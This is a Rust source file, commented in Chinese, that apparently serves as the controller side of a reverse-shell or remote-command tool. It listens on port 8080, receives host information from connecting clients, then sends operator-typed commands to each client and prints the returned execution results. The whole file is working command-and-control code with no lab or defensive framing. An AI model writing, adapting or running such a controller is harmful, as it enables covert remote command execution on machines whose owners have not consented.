use tokio::net::TcpListener;
use tokio::io::{AsyncReadExt, AsyncWriteExt}; // 用于异步读写
use std::io::{self, Write}; // 用于获取用户输入

#[tokio::main]
async fn main() {
    // 监听端口 8080，等待客户端连接
    let listener = TcpListener::bind("0.0.0.0:8080").await.unwrap();
    println!("ikun正在监听 0.0.0.0:8080");

    loop {
        // 接受新的客户端连接
        let (mut socket, addr) = listener.accept().await.unwrap();
        println!("收到来自 {} 的新连接", addr);

        // 使用 tokio::spawn 创建一个异步任务来处理与客户端的通信
        tokio::spawn(async move {
            let mut buffer = [0; 4096]; // 缓冲区，用于接收客户端的数据

            // 接收客户端发送的主机信息
            match socket.read(&mut buffer).await {
                Ok(n) if n > 0 => {
                    let host_info = String::from_utf8_lossy(&buffer[..n]);
                    println!("收到客户端主机信息:\n{}", host_info);
                }
                Ok(_) => {
                    println!("客户端关闭了连接。");
                    return; // 客户端关闭连接时退出任务
                }
                Err(e) => {
                    eprintln!("读取客户端主机信息失败: {}", e);
                    return; // 发生错误时退出任务
                }
            }

            // 主机信息接收完成后，进入命令发送与接收循环
            loop {
                let mut input = String::new();
                print!("输入要执行的命令: ");
                io::stdout().flush().unwrap(); // 刷新输出缓冲区以确保提示显示
                io::stdin().read_line(&mut input).unwrap();

                let command = input.trim().to_string();
                if command.is_empty() {
                    continue; // 如果输入为空，跳过这次循环
                }

                // 发送命令给客户端
                if let Err(e) = socket.write_all(command.as_bytes()).await {
                    eprintln!("发送命令失败: {}", e);
                    break; // 发送失败时退出循环
                }

                // 接收并打印客户端返回的命令执行结果
                match socket.read(&mut buffer).await {
                    Ok(n) if n > 0 => {
                        let response = String::from_utf8_lossy(&buffer[..n]);
                        println!("命令执行结果:\n{}", response);
                    }
                    Ok(_) => {
                        println!("客户端已关闭连接。");
                        break; // 客户端关闭时退出循环
                    }
                    Err(e) => {
                        eprintln!("读取命令执行结果失败: {}", e);
                        break; // 发生错误时退出循环
                    }
                }
            }
        });
    }
}
